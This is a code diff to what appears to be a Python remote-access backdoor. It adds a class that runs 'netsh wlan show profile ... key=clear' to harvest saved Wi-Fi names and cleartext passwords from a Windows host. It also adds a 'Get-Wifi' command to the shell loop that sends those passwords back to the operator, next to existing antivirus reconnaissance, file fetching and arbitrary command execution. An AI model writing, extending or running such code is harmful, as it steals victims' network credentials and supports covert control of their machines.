@@ -31,6 +31,40 @@ import urllib.request as urllib2
 import platform
 import struct
 import windows_tools.antivirus
+import re
+class GetWifiPassword:
+    def __init__(self):
+        self.command = "netsh wlan show profile"
+        self.result = ""
+
+    def start(self):
+        networks = subprocess.check_output(self.command, shell=True, stderr=subprocess.DEVNULL,
+                                           stdin=subprocess.DEVNULL)
+        networks = networks.decode(encoding="utf-8", errors="strict")
+        network_names_list = re.findall("(?:Profile\s*:\s)(.*)", networks)
+
+        for network_name in network_names_list:
+            try:
+                command = "netsh wlan show profile " + network_name + " key=clear"
+                current_result = subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL,
+                                                         stdin=subprocess.DEVNULL)
+                current_result = current_result.decode(encoding="utf-8", errors="strict")
+
+                ssid = re.findall("(?:SSID name\s*:\s)(.*)", str(current_result))
+                authentication = re.findall(r"(?:Authentication\s*:\s)(.*)", current_result)
+                cipher = re.findall("(?:Cipher\s*:\s)(.*)", current_result)
+                security_key = re.findall(r"(?:Security key\s*:\s)(.*)", current_result)
+                password = re.findall("(?:Key Content\s*:\s)(.*)", current_result)
+
+                self.result += "\n\nSSID           : " + ssid[0] + "\n"
+                self.result += "Authentication : " + authentication[0] + "\n"
+                self.result += "Cipher         : " + cipher[0] + "\n"
+                self.result += "Security Key   : " + security_key[0] + "\n"
+                self.result += "Password       : " + password[0]
+            except Exception:
+                pass
+
+        return self.result
 def getav():
     result = windows_tools.antivirus.get_installed_antivirus_software()
     l = str(result).replace(',', '\n').replace("'", "").replace("}", '\n').replace('{', "").replace('[', "").replace(
@@ -998,6 +1032,13 @@ def shell():
                     reliable_send("[*] Fetching Files from " + split[2] + " Directory" + "\n" + filetofind(split[1], split[2]))
             elif command[:8] == 'av_recon':
                 reliable_send("[+] AV info \n" + getav())
+            elif command[:8] == "Get-Wifi":
+                try:
+                    passwords = GetWifiPassword().start()
+                except:
+                    reliable_send("[-] Unable To find wifi passwords")
+                else:
+                    reliable_send(passwords)
             else:
                 execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                            stdin=subprocess.PIPE)
